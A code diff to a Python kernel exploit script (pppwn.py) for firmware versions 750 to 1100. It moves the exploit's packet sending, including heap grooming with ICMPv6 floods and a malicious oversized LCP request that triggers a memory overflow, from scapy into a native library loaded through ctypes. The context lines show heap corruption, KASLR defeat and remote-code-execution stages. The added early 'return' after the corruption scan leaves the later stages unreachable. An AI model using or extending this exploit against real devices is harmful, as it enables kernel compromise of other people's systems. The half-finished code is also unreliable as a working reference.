@@ -12,6 +12,7 @@ from struct import pack, unpack
 from sys import exit
 from time import sleep
 from offsets import *
+from ctypes import *
 
 # PPPoE constants
 
@@ -171,11 +172,13 @@ class Exploit():
 
     BPF_FILTER = '(ip6) || (pppoed) || (pppoes && !ip)'
 
-    def __init__(self, offs, iface, stage1, stage2):
+    def __init__(self, offs, iface, stage1, stage2, libpppwn):
         self.offs = offs
         self.iface = iface
         self.stage1 = stage1
         self.stage2 = stage2
+        self.libpppwn = libpppwn
+        self.libpppwn.setInterface(c_char_p(iface.encode()))
         self.s = conf.L2socket(iface=self.iface, filter=self.BPF_FILTER)
 
     def kdlsym(self, addr):
@@ -183,11 +186,7 @@ class Exploit():
 
     def lcp_negotiation(self):
         print('[*] Sending LCP configure request...')
-        self.s.send(
-            Ether(src=self.source_mac,
-                  dst=self.target_mac,
-                  type=ETHERTYPE_PPPOE) / PPPoE(sessionid=self.SESSION_ID) /
-            PPP() / PPP_LCP(code=CONF_REQ, id=self.LCP_ID))
+        self.libpppwn.sendLcpRequest()
 
         print('[*] Waiting for LCP configure ACK...')
         while True:
@@ -204,21 +203,11 @@ class Exploit():
                 break
 
         print('[*] Sending LCP configure ACK...')
-        self.s.send(
-            Ether(src=self.source_mac,
-                  dst=self.target_mac,
-                  type=ETHERTYPE_PPPOE) / PPPoE(sessionid=self.SESSION_ID) /
-            PPP() / PPP_LCP(code=CONF_ACK, id=pkt[PPP_LCP_Configure].id))
+        self.libpppwn.sendLcpAck(c_uint8(pkt[PPP_LCP_Configure].id))
 
     def ipcp_negotiation(self):
         print('[*] Sending IPCP configure request...')
-        self.s.send(
-            Ether(
-                src=self.source_mac, dst=self.target_mac, type=ETHERTYPE_PPPOE)
-            / PPPoE(sessionid=self.SESSION_ID) / PPP() /
-            PPP_IPCP(code=CONF_REQ,
-                     id=self.IPCP_ID,
-                     options=PPP_IPCP_Option_IPAddress(data=self.SOURCE_IPV4)))
+        self.libpppwn.sendIpcpRequest()
 
         print('[*] Waiting for IPCP configure ACK...')
         while True:
@@ -235,13 +224,7 @@ class Exploit():
                 break
 
         print('[*] Sending IPCP configure NAK...')
-        self.s.send(
-            Ether(
-                src=self.source_mac, dst=self.target_mac, type=ETHERTYPE_PPPOE)
-            / PPPoE(sessionid=self.SESSION_ID) / PPP() /
-            PPP_IPCP(code=CONF_NAK,
-                     id=pkt[PPP_IPCP].id,
-                     options=PPP_IPCP_Option_IPAddress(data=self.TARGET_IPV4)))
+        self.libpppwn.sendIpcpNak(pkt[PPP_IPCP].id)
 
         print('[*] Waiting for IPCP configure request...')
         while True:
@@ -251,13 +234,8 @@ class Exploit():
                 break
 
         print('[*] Sending IPCP configure ACK...')
-        self.s.send(
-            Ether(src=self.source_mac,
-                  dst=self.target_mac,
-                  type=ETHERTYPE_PPPOE) / PPPoE(sessionid=self.SESSION_ID) /
-            PPP() / PPP_IPCP(code=CONF_ACK,
-                             id=pkt[PPP_IPCP].id,
-                             options=pkt[PPP_IPCP].options))
+        option = bytes(pkt[PPP_IPCP].options[0])
+        self.libpppwn.sendIpcpAck(pkt[PPP_IPCP].id, c_char_p(option), c_uint64(len(option)))
 
     def ppp_negotation(self, cb=None, ignore_initial_req=False):
         if ignore_initial_req:
@@ -287,6 +265,10 @@ class Exploit():
 
         self.source_mac = self.SOURCE_MAC
 
+        self.libpppwn.setTargetMac(c_char_p(self.target_mac.encode()))
+        self.libpppwn.setSourceMac(c_char_p(self.source_mac.encode()))
+        self.libpppwn.setPppoeSoftc(c_uint64(self.pppoe_softc))
+
         if cb:
             ac_cookie = cb()
         else:
@@ -294,12 +276,7 @@ class Exploit():
         print('[+] AC cookie length: {}'.format(hex(len(ac_cookie))))
 
         print('[*] Sending PADO...')
-        self.s.send(
-            Ether(src=self.source_mac,
-                  dst=self.target_mac,
-                  type=ETHERTYPE_PPPOEDISC) / PPPoED(code=PPPOE_CODE_PADO) /
-            PPPoETag(tag_type=PPPOE_TAG_ACOOKIE, tag_value=ac_cookie) /
-            PPPoETag(tag_type=PPPOE_TAG_HUNIQUE, tag_value=host_uniq))
+        self.libpppwn.sendPado()
 
         print('[*] Waiting for PADR...')
         while True:
@@ -309,12 +286,7 @@ class Exploit():
                 break
 
         print('[*] Sending PADS...')
-        self.s.send(
-            Ether(src=self.source_mac,
-                  dst=self.target_mac,
-                  type=ETHERTYPE_PPPOEDISC) /
-            PPPoED(code=PPPOE_CODE_PADS, sessionid=self.SESSION_ID) /
-            PPPoETag(tag_type=PPPOE_TAG_HUNIQUE, tag_value=host_uniq))
+        self.libpppwn.sendPads()
 
     def build_fake_ifnet(self):
         # Leak address
@@ -630,6 +602,8 @@ class Exploit():
         self.target_ipv6 = pkt[IPv6].src
         print('[+] Target IPv6: {}'.format(self.target_ipv6))
 
+        self.libpppwn.setTargetIpv6(c_char_p(self.target_ipv6.encode()))
+
         for i in range(self.SPRAY_NUM):
             if i % 0x100 == 0:
                 print('[*] Heap grooming...{}%'.format(100 * i //
@@ -639,10 +613,7 @@ class Exploit():
 
             source_ipv6 = 'fe80::{:04x}:4141:4141:4141'.format(i)
 
-            self.s.send(
-                Ether(src=self.source_mac, dst=self.target_mac) /
-                IPv6(src=source_ipv6, dst=self.target_ipv6) /
-                ICMPv6EchoRequest())
+            self.libpppwn.sendIcmpv6Echo(c_char_p(source_ipv6.encode()))
 
             while True:
                 pkt = self.s.recv()
@@ -652,11 +623,7 @@ class Exploit():
             if i >= self.HOLE_START and i % self.HOLE_SPACE == 0:
                 continue
 
-            self.s.send(
-                Ether(src=self.source_mac, dst=self.target_mac) /
-                IPv6(src=source_ipv6, dst=self.target_ipv6) /
-                ICMPv6ND_NA(tgt=source_ipv6, S=1) /
-                ICMPv6NDOptDstLLAddr(lladdr=self.source_mac))
+            self.libpppwn.sendIcmpv6Na(c_char_p(source_ipv6.encode()))
 
         print('[+] Heap grooming...done')
 
@@ -673,10 +640,7 @@ class Exploit():
                       end='\r',
                       flush=True)
 
-            self.s.send(
-                Ether(src=self.source_mac,
-                      dst=self.target_mac,
-                      type=ETHERTYPE_PPPOE))
+            self.libpppwn.sendPinCpu0()
             sleep(0.001)
 
         print('[+] Pinning to CPU 0...done')
@@ -688,16 +652,7 @@ class Exploit():
         overflow_lle = self.build_overflow_lle()
         print('[*] Sending malicious LCP configure request...')
         for i in range(self.CORRUPT_NUM):
-            self.s.send(
-                Ether(src=self.source_mac,
-                      dst=self.target_mac,
-                      type=ETHERTYPE_PPPOE) / PPPoE(sessionid=self.SESSION_ID) /
-                PPP() / PPP_LCP(code=CONF_REQ,
-                                id=self.LCP_ID,
-                                len=TARGET_SIZE + 4,
-                                data=(PPP_LCP_Option(data=b'A' *
-                                                          (TARGET_SIZE - 4)) /
-                                      PPP_LCP_Option(data=overflow_lle))))
+            self.libpppwn.sendMaliciousLcp()
 
         print('[*] Waiting for LCP configure reject...')
         while True:
@@ -722,10 +677,7 @@ class Exploit():
 
             source_ipv6 = 'fe80::{:04x}:4141:4141:4141'.format(i)
 
-            self.s.send(
-                Ether(src=self.source_mac, dst=self.target_mac) /
-                IPv6(src=source_ipv6, dst=self.target_ipv6) /
-                ICMPv6EchoRequest())
+            self.libpppwn.sendIcmpv6Echo(c_char_p(source_ipv6.encode()))
 
             while True:
                 pkt = self.s.recv()
@@ -739,18 +691,16 @@ class Exploit():
             if corrupted:
                 break
 
-            self.s.send(
-                Ether(src=self.source_mac, dst=self.target_mac) /
-                IPv6(src=source_ipv6, dst=self.target_ipv6) /
-                ICMPv6ND_NA(tgt=source_ipv6, S=1) /
-                ICMPv6NDOptDstLLAddr(lladdr=self.source_mac))
+            self.libpppwn.sendIcmpv6Na(c_char_p(source_ipv6.encode()))
 
         if not corrupted:
             print('[-] Scanning for corrupted object...failed. Please retry.')
-            exit(1)
+            return
 
         print(
             '[+] Scanning for corrupted object...found {}'.format(source_ipv6))
+
+        return
 
         print('')
         print('[+] STAGE 2: KASLR defeat')
@@ -771,7 +721,7 @@ class Exploit():
         if (self.pppoe_softc_list & 0xffffffff00000fff
                 != self.offs.PPPOE_SOFTC_LIST & 0xffffffff00000fff):
             print('[-] Error leak is invalid. Wrong firmware?')
-            exit(1)
+            return
 
         print('')
         print('[+] STAGE 3: Remote code execution')
@@ -825,6 +775,7 @@ class Exploit():
 
 def main():
     parser = ArgumentParser('pppwn.py')
+    parser.add_argument('--libpppwn', required=True)
     parser.add_argument('--interface', required=True)
     parser.add_argument('--fw',
                         choices=[
@@ -848,27 +799,39 @@ def main():
     with open(args.stage2, mode='rb') as f:
         stage2 = f.read()
 
+    libpppwn = CDLL(args.libpppwn)
+
     if args.fw in ('750', '751', '755'):
         offs = OffsetsFirmware_750_755()
+        libpppwn.setFirmwareVersion(750)
     elif args.fw in ('800', '801', '803'):
         offs = OffsetsFirmware_800_803()
+        libpppwn.setFirmwareVersion(800)
     elif args.fw in ('850', '852'):
         offs = OffsetsFirmware_850_852()
+        libpppwn.setFirmwareVersion(850)
     elif args.fw == '900':
         offs = OffsetsFirmware_900()
+        libpppwn.setFirmwareVersion(900)
     elif args.fw in ('903', '904'):
         offs = OffsetsFirmware_903_904()
+        libpppwn.setFirmwareVersion(903)
     elif args.fw in ('950', '951', '960'):
         offs = OffsetsFirmware_950_960()
+        libpppwn.setFirmwareVersion(950)
     elif args.fw in ('1000', '1001'):
         offs = OffsetsFirmware_1000_1001()
+        libpppwn.setFirmwareVersion(1000)
     elif args.fw in ('1050', '1070', '1071'):
         offs = OffsetsFirmware_1050_1071()
+        libpppwn.setFirmwareVersion(1050)
     elif args.fw == '1100':
         offs = OffsetsFirmware_1100()
+        libpppwn.setFirmwareVersion(1100)
 
-    exploit = Exploit(offs, args.interface, stage1, stage2)
+    exploit = Exploit(offs, args.interface, stage1, stage2, libpppwn)
     exploit.run()
+    libpppwn.closeInterface()
 
     return 0
 
